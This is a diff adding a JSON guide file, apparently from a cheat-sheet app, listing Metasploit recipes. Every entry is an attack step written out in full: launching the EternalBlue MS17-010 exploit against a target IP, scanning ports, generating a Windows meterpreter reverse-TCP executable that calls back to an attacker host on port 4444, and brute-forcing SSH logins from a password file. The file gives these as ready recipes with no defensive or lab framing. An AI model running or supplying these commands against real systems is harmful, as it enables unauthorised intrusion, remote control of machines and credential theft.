@@ -1,0 +1,40 @@
+{
+  "name": "Metasploit",
+  "guides": [
+    {
+      "id": 1,
+      "title": "Start Metasploit Console",
+      "description": "Launch the Metasploit Framework console.",
+      "command": "msfconsole",
+      "explanation": "Opens the interactive console for running exploits and payloads."
+    },
+    {
+      "id": 2,
+      "title": "Exploit a Windows SMB Vulnerability",
+      "description": "Use the MS17-010 EternalBlue exploit.",
+      "command": "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.100\nrun",
+      "explanation": "Targets a Windows machine with the MS17-010 vulnerability."
+    },
+    {
+      "id": 3,
+      "title": "Scan for Open Ports",
+      "description": "Use Nmap integration to scan a target.",
+      "command": "use auxiliary/scanner/portscan/tcp\nset RHOSTS 192.168.1.100\nrun",
+      "explanation": "Performs a TCP port scan on the target IP."
+    },
+    {
+      "id": 4,
+      "title": "Create a Reverse Shell",
+      "description": "Generate a reverse TCP payload.",
+      "command": "use payload/windows/meterpreter/reverse_tcp\nset LHOST 192.168.1.10\nset LPORT 4444\ngenerate -f exe -o payload.exe",
+      "explanation": "Creates an executable that connects back to the attacker's IP and port."
+    },
+    {
+      "id": 5,
+      "title": "Brute Force SSH",
+      "description": "Attempt to brute force SSH credentials.",
+      "command": "use auxiliary/scanner/ssh/ssh_login\nset RHOSTS 192.168.1.100\nset USERNAME user\nset PASS_FILE passwords.txt\nrun",
+      "explanation": "Tries username/password combinations from a file against the target's SSH."
+    }
+  ]
+}
